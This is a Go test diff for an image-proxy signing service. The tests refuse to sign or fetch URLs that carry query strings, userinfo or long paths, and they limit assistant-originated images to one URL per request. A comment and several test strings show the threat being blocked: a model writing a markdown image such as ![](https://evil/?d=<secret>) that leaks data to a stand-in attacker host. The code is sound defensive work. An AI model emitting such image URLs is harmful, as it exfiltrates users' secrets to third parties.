@@ -47,7 +47,7 @@ func TestCamoSign_DisabledIs404(t *testing.T) {
 
 func TestCamoSign_MintsProxiableOnly(t *testing.T) {
 	h := NewCamoHandler(enabledCamo(t))
-	body := `{"urls":["https://e.com/a.png","/relative.png","data:image/png;base64,AAAA","mailto:x@y","https://e.com/b.jpg"]}`
+	body := `{"origin":"issue","urls":["https://e.com/a.png","/relative.png","data:image/png;base64,AAAA","mailto:x@y","https://e.com/b.jpg"]}`
 	rec := httptest.NewRecorder()
 	h.HandleSign(rec, withAuth(httptest.NewRequest(http.MethodPost, "/api/img/sign", strings.NewReader(body)), "k1"))
 	if rec.Code != http.StatusOK {
@@ -174,3 +174,97 @@ func TestCamoFetch_MalformedExpIs403(t *testing.T) {
 }
 
 func itoa(n int64) string { return strconv.FormatInt(n, 10) }
+
+// Origin + mint rule (GHSA 2026-10-31 §7).
+
+// signCall posts body to the sign handler and decodes the response.
+func signCall(t *testing.T, h *CamoHandler, body string) (int, map[string]string) {
+	t.Helper()
+	rec := httptest.NewRecorder()
+	h.HandleSign(rec, withAuth(httptest.NewRequest(http.MethodPost, "/api/img/sign", strings.NewReader(body)), "k1"))
+	var resp struct {
+		Signatures map[string]string `json:"signatures"`
+	}
+	_ = json.Unmarshal(rec.Body.Bytes(), &resp)
+	return rec.Code, resp.Signatures
+}
+
+func TestCamoSign_RefusesQueryUserinfoAndLongPath(t *testing.T) {
+	// Issue content stays automatic, but no origin gets a URL that can carry a
+	// payload to the foreign host: the model writes ![](https://evil/?d=<secret>).
+	h := NewCamoHandler(enabledCamo(t))
+	longPath := "https://e.com/" + strings.Repeat("a", camo.MaxPathLen)
+	body, _ := json.Marshal(map[string]any{
+		"origin": "issue",
+		"urls": []string{
+			"https://e.com/ok.png",
+			"https://evil.example/p.png?d=secret",
+			"https://secret@evil.example/p.png",
+			longPath,
+		},
+	})
+	code, sigs := signCall(t, h, string(body))
+	if code != http.StatusOK {
+		t.Fatalf("status = %d, want 200", code)
+	}
+	if len(sigs) != 1 || sigs["https://e.com/ok.png"] == "" {
+		t.Fatalf("signed %v, want exactly https://e.com/ok.png", sigs)
+	}
+
+	for _, u := range []string{"https://evil.example/p.png?d=secret", "https://evil.example/p.png?"} {
+		b, _ := json.Marshal(map[string]any{"origin": "assistant", "urls": []string{u}})
+		code, sigs = signCall(t, h, string(b))
+		if code != http.StatusOK || len(sigs) != 0 {
+			t.Errorf("assistant %q: status %d signatures %v, want 200 and none", u, code, sigs)
+		}
+	}
+}
+
+func TestCamoSign_AssistantOneURLPerRequest(t *testing.T) {
+	h := NewCamoHandler(enabledCamo(t))
+
+	// The click signs exactly the clicked image.
+	code, sigs := signCall(t, h, `{"origin":"assistant","urls":["https://e.com/a.png"]}`)
+	if code != http.StatusOK || sigs["https://e.com/a.png"] == "" {
+		t.Fatalf("single assistant url: status %d sigs %v, want 200 + signature", code, sigs)
+	}
+	// A duplicate of the same URL is still one image.
+	if code, _ = signCall(t, h, `{"origin":"assistant","urls":["https://e.com/a.png","https://e.com/a.png"]}`); code != http.StatusOK {
+		t.Errorf("duplicate single url: status %d, want 200", code)
+	}
+	// A batch is a render-time sign: refused whole, nothing signed.
+	code, sigs = signCall(t, h, `{"origin":"assistant","urls":["https://e.com/a.png","https://e.com/b.png"]}`)
+	if code != http.StatusBadRequest || len(sigs) != 0 {
+		t.Errorf("assistant batch: status %d sigs %v, want 400 and none", code, sigs)
+	}
+	// An absent origin gets the assistant rule (fail-closed default).
+	if code, _ = signCall(t, h, `{"urls":["https://e.com/a.png","https://e.com/b.png"]}`); code != http.StatusBadRequest {
+		t.Errorf("batch without origin: status %d, want 400", code)
+	}
+	// Issue content keeps batch signing.
+	code, sigs = signCall(t, h, `{"origin":"issue","urls":["https://e.com/a.png","https://e.com/b.png"]}`)
+	if code != http.StatusOK || len(sigs) != 2 {
+		t.Errorf("issue batch: status %d sigs %v, want 200 + 2", code, sigs)
+	}
+}
+
+func TestCamoSign_UnknownOriginIs400(t *testing.T) {
+	h := NewCamoHandler(enabledCamo(t))
+	if code, _ := signCall(t, h, `{"origin":"chat","urls":["https://e.com/a.png"]}`); code != http.StatusBadRequest {
+		t.Fatalf("unknown origin status = %d, want 400", code)
+	}
+}
+
+func TestCamoFetch_QueryURLRefusedDespiteValidSig(t *testing.T) {
+	// A signature minted before the rule (SignedPath signs whatever it is
+	// handed) must not be redeemable for a query-carrying URL: 403, ZERO fetch
+	// — the host does not even resolve, so a fetch attempt would be a 502.
+	svc := enabledCamo(t)
+	h := NewCamoHandler(svc)
+	for _, u := range []string{"https://evil.invalid/p.png?d=secret", "https://secret@evil.invalid/p.png"} {
+		rec := routeFetch(h, svc.SignedPath(u))
+		if rec.Code != http.StatusForbidden {
+			t.Errorf("redeem %q: status %d, want 403", u, rec.Code)
+		}
+	}
+}
